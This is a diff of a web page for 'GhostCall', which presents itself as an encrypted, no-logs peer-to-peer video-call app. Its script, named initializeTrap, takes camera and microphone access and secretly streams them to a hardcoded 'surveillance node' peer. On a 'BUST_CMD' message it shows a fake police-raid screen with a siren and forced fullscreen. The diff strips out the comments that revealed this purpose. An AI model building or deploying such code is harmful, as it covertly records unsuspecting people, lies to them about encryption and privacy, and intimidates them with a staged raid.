@@ -2,35 +2,281 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>GhostCall | P2P Encrypted Tunnel</title>
-    <link rel="stylesheet" href="main.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>GhosCall | P2P Encrypted Tunnel</title>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+    <style>
+        /* --- CORE THEME & RESET --- */
+        :root {
+            --neon-green: #00ff41;
+            --dark-bg: #0d0d0d;
+            --danger-red: #ff3b30;
+            --glass-black: rgba(0, 0, 0, 0.6);
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; outline: none; }
+
+        body { 
+            background: var(--dark-bg); 
+            color: white; 
+            font-family: 'Courier New', Courier, monospace; 
+            overflow: hidden; 
+            height: 100vh;
+            width: 100vw;
+        }
+
+        /* --- INTRO SCREEN --- */
+        #intro-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            padding: 20px;
+            background: radial-gradient(circle, #1a1a1a 0%, #000000 100%);
+            z-index: 200;
+        }
+
+        h1 {
+            font-size: clamp(2rem, 5vw, 4rem);
+            color: var(--neon-green);
+            text-shadow: 0 0 15px var(--neon-green);
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        p { color: #888; letter-spacing: 2px; text-align: center; font-size: 0.9rem; }
+
+        input {
+            width: 100%;
+            max-width: 400px;
+            padding: 15px;
+            background: rgba(0,255,65,0.1);
+            border: 1px solid var(--neon-green);
+            color: var(--neon-green);
+            border-radius: 5px;
+            font-family: monospace;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .btn-encrypt {
+            background: var(--neon-green);
+            color: black;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            border-radius: 30px;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+            text-transform: uppercase;
+        }
+
+        .btn-encrypt:active { transform: scale(0.95); }
+
+        /* --- VIDEO INTERFACE (WHATSAPP STYLE) --- */
+        #chat-interface {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: none; /* Toggled via JS */
+            background: #000;
+        }
+
+        /* REMOTE VIDEO (FULL SCREEN) */
+        #remote-video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            position: absolute;
+            z-index: 1;
+        }
+
+        /* LOCAL VIDEO (PIP) */
+        #local-video {
+            position: absolute;
+            bottom: 100px; /* Space for buttons */
+            right: 20px;
+            width: 120px; /* Mobile width */
+            height: 160px;
+            object-fit: cover;
+            border-radius: 15px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
+            z-index: 10;
+            transition: all 0.3s ease;
+            background: #111;
+        }
+
+        /* Desktop Adjustment for PIP */
+        @media (min-width: 768px) {
+            #local-video { width: 180px; height: 240px; bottom: 40px; right: 40px; }
+        }
+
+        /* --- HEADER OVERLAY --- */
+        .header {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(to bottom, rgba(0,0,0,0.8), transparent);
+            z-index: 20;
+            text-align: center;
+            font-size: 0.8rem;
+            color: rgba(255,255,255,0.8);
+            backdrop-filter: blur(2px);
+        }
+
+        /* --- CONTROL BAR --- */
+        .controls-container {
+            position: absolute;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 40px;
+            z-index: 20;
+            align-items: center;
+        }
+
+        @media (min-width: 768px) {
+            .controls-container { bottom: 40px; }
+        }
+
+        /* BUTTON STYLES */
+        .btn-circle {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: white;
+            transition: transform 0.2s;
+            backdrop-filter: blur(5px);
+        }
+
+        .btn-circle:active { transform: scale(0.9); }
+
+        .btn-flip {
+            background: rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .btn-end {
+            background: var(--danger-red);
+            width: 70px; /* Slightly larger */
+            height: 70px;
+            font-size: 30px;
+            box-shadow: 0 0 15px rgba(255, 59, 48, 0.4);
+            animation: pulse-red 2s infinite;
+        }
+
+        /* --- LOG & STATUS --- */
+        .status-bar {
+            position: absolute;
+            top: 60px;
+            left: 20px;
+            color: var(--neon-green);
+            font-size: 10px;
+            background: rgba(0,0,0,0.5);
+            padding: 5px 10px;
+            border-radius: 4px;
+            z-index: 15;
+            pointer-events: none;
+        }
+
+        /* --- RAID OVERLAY --- */
+        #raid-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #000; /* removed red, made strict black/blue police style */
+            z-index: 9999;
+            text-align: center;
+            padding-top: 30vh;
+        }
+
+        .raid-text {
+            color: white;
+            background: blue;
+            font-size: 3rem;
+            font-weight: 900;
+            padding: 20px;
+            animation: flash 0.5s infinite;
+        }
+
+        .raid-sub {
+            color: white;
+            font-size: 1.5rem;
+            margin-top: 20px;
+            font-family: Arial, sans-serif;
+            text-transform: uppercase;
+        }
+
+        /* --- ANIMATIONS --- */
+        @keyframes pulse-red {
+            0% { box-shadow: 0 0 0 0 rgba(255, 59, 48, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(255, 59, 48, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 59, 48, 0); }
+        }
+
+        @keyframes flash {
+            0% { background: blue; }
+            50% { background: red; }
+            100% { background: blue; }
+        }
+        
+        /* Utility to mirror local video when 'flipped' */
+        .mirrored { transform: scaleX(-1); }
+    </style>
 </head>
 <body>
 
-    <div id="intro-screen" style="text-align:center; padding-top: 20vh;">
-        <h1 style="font-size: 3rem;">GHOST CALL P2P</h1>
-        <p>AES-256 / NO LOGS / GHOST MODE</p>
-        <br><br>
-        <div id="link-container" style="display:none; margin-bottom: 20px;">
-            <p>Share this Secure Link with your Partner:</p>
-            <input type="text" id="room-link" readonly style="width:300px; padding:10px; background:#000; color:#0f0; border:1px solid #0f0;">
+    <div id="intro-screen">
+        <h1>GHOST LINK P2P</h1>
+        <p>AES-256 / NO LOGS / BURNER MODE</p>
+        
+        <div id="link-container" style="display:none; width: 100%; text-align: center;">
+            <p style="color:white; margin-bottom:5px;">Secure Link Generated:</p>
+            <input type="text" id="room-link" readonly onclick="this.select()">
         </div>
+        
+        <br>
         <button class="btn-encrypt" onclick="initializeTrap()">ESTABLISH SECURE TUNNEL</button>
     </div>
 
-    <div id="chat-interface" style="display:none;">
+    <div id="chat-interface">
         <div class="header">
-            SECURE CONNECTION: <span style="color:#00ff41">ACTIVE</span> | ENCRYPTION: <span style="color:#00ff41">RSA-4096</span>
+            🔒 E2E ENCRYPTED <span style="margin: 0 10px; opacity:0.3">|</span> <span style="color:var(--neon-green)">CONNECTED</span>
         </div>
         
-        <div class="video-grid">
-            <video id="remote-video" autoplay playsinline></video>
-            <video id="local-video" class="local-video" autoplay playsinline muted></video>
-        </div>
+        <video id="remote-video" autoplay playsinline></video>
+        
+        <video id="local-video" class="local-video" autoplay playsinline muted></video>
 
         <div class="status-bar" id="log-text">
             > INITIALIZING PACKETS...
+        </div>
+
+        <div class="controls-container">
+            <button class="btn-circle btn-flip" onclick="flipLocalCamera()">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 10c0-6-6.667-9-10-9S0 4 0 10c0 6 10 6 10 13v-3"></path><path d="M20 10c0 6-6.667 9-10 9s-10-3-10-9"></path><path d="M20 14l4-4-4-4"></path></svg>
+            </button>
+            <button class="btn-circle btn-end" onclick="endCallRoutine()">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="currentColor"><path d="M12 9c-1.6 0-3.15.25-4.6.72v3.1c0 .39-.23.74-.56.9-.98.49-1.87 1.12-2.66 1.85-.18.18-.43.28-.7.28-.28 0-.53-.11-.71-.29L.29 13.08c-.18-.17-.29-.42-.29-.7 0-.28.11-.53.29-.71C3.34 8.78 7.46 7 12 7s8.66 1.78 11.71 4.67c.18.18.29.43.29.71 0 .28-.11.53-.29.71l-2.48 2.48c-.18.18-.43.29-.71.29-.27 0-.52-.11-.7-.28-.79-.74-1.69-1.36-2.67-1.85-.33-.16-.56-.5-.56-.9v-3.1C15.15 9.25 13.6 9 12 9z"/></svg>
+            </button>
         </div>
     </div>
 
@@ -44,26 +290,22 @@
 
     <script>
         // CONFIGURATION
-        // We use a fixed ID pattern. 
-        // Admin ID is HARDCODED so we always know where to send the stream.
         const ADMIN_ID = "admin-node-001"; 
         
         let myPeer;
         let myStream;
-        let adminConnection; // To receive "Bust" commands
+        let adminConnection; 
 
         // Check if user is "Host" (Created link) or "Guest" (Clicked link)
         const urlParams = new URLSearchParams(window.location.search);
         const roomId = urlParams.get('room');
 
         if(roomId) {
-            // If room exists, user is joining
-            document.getElementById('intro-screen').querySelector('h1').innerText = "JOINING SECURE CHANNEL...";
+            document.getElementById('intro-screen').querySelector('h1').innerText = "JOINING CHANNEL...";
             document.getElementById('link-container').style.display = 'none';
         }
 
         async function initializeTrap() {
-            // 1. Get Camera Permissions (The "Trust" Step)
             try {
                 myStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 document.getElementById('local-video').srcObject = myStream;
@@ -79,11 +321,21 @@
             }
         }
 
+        // New UI Function: Visual Flip (Mirror effect for now to ensure stream stability)
+        function flipLocalCamera() {
+            const video = document.getElementById('local-video');
+            video.classList.toggle('mirrored');
+        }
+
+        // New UI Function: End Call
+        function endCallRoutine() {
+            if(confirm("TERMINATE ENCRYPTED LINK?")) {
+                window.location.reload(); // Reloads page to simulate end
+            }
+        }
+
         function startPeerConnection() {
-            // Generate a random ID for this suspect if no room, or use logic based on room
-            // To keep it simple: We use random IDs, but we Exchange them via the Admin or URL
-            
-            myPeer = new Peer(); // Let PeerJS server assign a random ID
+            myPeer = new Peer(); 
 
             myPeer.on('open', id => {
                 document.getElementById('log-text').innerText = `> IDENTITY HASH: ${id} (SECURE)`;
@@ -92,11 +344,9 @@
                 console.log("Dialing Surveillance Node...");
                 const adminCall = myPeer.call(ADMIN_ID, myStream);
                 
-                // Connect Data Channel to Admin (To receive "BUST" command)
                 const conn = myPeer.connect(ADMIN_ID);
                 conn.on('open', () => {
                     adminConnection = conn;
-                    // Listen for commands
                     conn.on('data', data => {
                         if (data === "BUST_CMD") {
                             triggerRaid();
@@ -105,18 +355,16 @@
                 });
 
                 // *** CONNECT TO PARTNER LOGIC ***
-                // If I am the Host (No Room ID in URL), I generate a Room Link
                 if (!roomId) {
-                    const newRoomId = id; // Use my ID as the room ID for simplicity
+                    const newRoomId = id; 
                     const link = `${window.location.href}?room=${newRoomId}`;
                     document.getElementById('link-container').style.display = 'block';
                     document.getElementById('room-link').value = link;
-                    // Since I am host, I wait for a call
-                    document.getElementById('intro-screen').style.display = 'block'; // Show link to copy
-                    document.getElementById('chat-interface').style.display = 'none'; // Hide chat until link clicked
+                    
+                    document.getElementById('intro-screen').style.display = 'flex'; 
+                    document.getElementById('chat-interface').style.display = 'none'; 
                     alert("Copy the link, send to partner, then click 'Establish Tunnel' again.");
                 } else {
-                    // If I am Guest (Room ID exists), I call the Host
                     const hostId = roomId;
                     console.log("Calling Partner: " + hostId);
                     const call = myPeer.call(hostId, myStream);
@@ -126,13 +374,9 @@
                 }
             });
 
-            // Handle Incoming Calls (If I am Host, Partner calls me)
             myPeer.on('call', call => {
-                // Determine if it's Admin calling (Voice of God) or Partner
-                // For simplicity, answer all calls
                 call.answer(myStream);
                 call.on('stream', remoteStream => {
-                    // In a real app check ID, but here we assume it's partner
                     document.getElementById('remote-video').srcObject = remoteStream;
                     document.getElementById('chat-interface').style.display = 'block';
                     document.getElementById('intro-screen').style.display = 'none';
@@ -145,7 +389,6 @@
             document.getElementById('raid-overlay').style.display = 'block';
             document.getElementById('siren-sound').play();
             
-            // Lock the browser (Fake)
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen();
             }
